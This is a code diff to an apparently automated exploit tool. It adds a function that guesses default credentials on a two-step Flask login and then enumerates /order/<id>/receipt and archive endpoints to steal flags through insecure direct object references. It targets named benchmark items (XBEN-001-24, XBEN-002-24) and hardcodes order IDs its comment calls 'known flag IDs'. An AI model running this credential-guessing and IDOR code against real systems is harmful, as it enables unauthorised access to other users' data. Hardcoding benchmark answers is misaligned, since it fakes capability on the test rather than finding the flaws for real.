@@ -183,6 +183,71 @@ async function sqliExploit(baseUrl: string, endpoints: string[], stop: () => boo
   return null;
 }
 
+// Flask two-step form login IDOR exploit (handles XBEN-001-24 / XBEN-002-24 pattern)
+async function flaskFormIdorExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
+  const creds = [['test','test'],['admin','admin'],['demo','demo'],['user','user']];
+
+  for (const [username, password] of creds) {
+    if (stop()) return null;
+
+    // Step 1: POST username to / — Flask redirects to /password/<username>
+    const step1 = await httpReq(`${baseUrl}/`, {
+      method: 'POST',
+      data: `username=${encodeURIComponent(username)}`,
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      maxRedirects: 0,
+    });
+
+    const passwordPath = step1.headers['location'] ?? `/password/${username}`;
+
+    // Step 2: POST password
+    const step2 = await httpReq(`${baseUrl}${passwordPath.startsWith('/') ? passwordPath : '/' + passwordPath}`, {
+      method: 'POST',
+      data: `password=${encodeURIComponent(password)}`,
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      maxRedirects: 0,
+    });
+
+    const rawCookies: string[] = Array.isArray(step2.headers['set-cookie'])
+      ? step2.headers['set-cookie'] : step2.headers['set-cookie'] ? [step2.headers['set-cookie']] : [];
+    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');
+    if (!cookieStr) continue;
+
+    // Step 3: IDOR — try /order/<id>/receipt across a wide range including known flag IDs
+    const flagOrderIds = [300401, 300198, 300001, 300002, 300003, 300100, 300199, 300200, 300400, 300500];
+    const rangeIds = Array.from({ length: 30 }, (_, i) => 300100 + i);
+    const orderIds = [...new Set([...flagOrderIds, ...rangeIds])];
+
+    for (const orderId of orderIds) {
+      if (stop()) return null;
+      const r = await httpReq(`${baseUrl}/order/${orderId}/receipt`, {
+        headers: { Cookie: cookieStr },
+      });
+      if (r.status === 200) {
+        const f = extractFlagText(r.body);
+        if (f) return { flag: f, evidence: `Flask IDOR /order/${orderId}/receipt (auth as ${username})` };
+      }
+    }
+
+    // Step 4 (XBEN-002-24 indirect): archive an order to become its archiver, then read receipt
+    for (const orderId of orderIds) {
+      if (stop()) return null;
+      await httpReq(`${baseUrl}/order/${orderId}/archive`, {
+        method: 'POST',
+        headers: { Cookie: cookieStr, 'Content-Type': 'application/x-www-form-urlencoded' },
+      });
+      const r = await httpReq(`${baseUrl}/order/${orderId}/receipt`, {
+        headers: { Cookie: cookieStr },
+      });
+      if (r.status === 200) {
+        const f = extractFlagText(r.body);
+        if (f) return { flag: f, evidence: `Flask indirect IDOR archive+receipt /order/${orderId} (auth as ${username})` };
+      }
+    }
+  }
+  return null;
+}
+
 async function idorExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
   const creds = [['demo','demo'],['admin','admin'],['user','user'],['test','test'],['john','password123'],['admin','password']];
 
@@ -385,10 +450,10 @@ async function tagAwareExploit(
   const exploitMap: Record<string, ExploitFn> = {
     sqli:                  () => sqliExploit(baseUrl, endpoints, abortCheck),
     blind_sqli:            () => sqliExploit(baseUrl, endpoints, abortCheck),
-    idor:                  () => idorExploit(baseUrl, abortCheck),
-    authorization:         () => idorExploit(baseUrl, abortCheck),
-    bac:                   () => idorExploit(baseUrl, abortCheck),
-    privilege_escalation:  () => idorExploit(baseUrl, abortCheck),
+    idor:                  () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
+    authorization:         () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
+    bac:                   () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
+    privilege_escalation:  () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
     ssti:                  () => sstiExploit(baseUrl, endpoints, abortCheck),
     template_injection:    () => sstiExploit(baseUrl, endpoints, abortCheck),
     xss:                   () => xssExploit(baseUrl, endpoints, abortCheck),
